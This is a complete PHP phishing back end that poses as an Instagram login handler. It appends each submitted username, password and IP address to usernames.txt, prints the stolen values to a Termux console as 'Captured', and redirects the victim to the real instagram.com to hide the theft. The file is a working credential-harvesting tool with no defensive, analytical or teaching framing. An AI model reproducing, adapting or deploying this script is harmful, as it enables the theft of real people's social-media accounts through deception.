<?php
header('Location: https://instagram.com');
$handle = fopen("usernames.txt", "a");

$ip = $_SERVER['REMOTE_ADDR'];
$username = $_POST['username'];
$password = $_POST['password'];

fwrite($handle, "Username: " . $username . " | Password: " . $password . " | IP: " . $ip . "\n");
fclose($handle);

// Real-time output to Termux
echo "Captured -> Username: $username | Password: $password | IP: $ip\n";
exit();
?>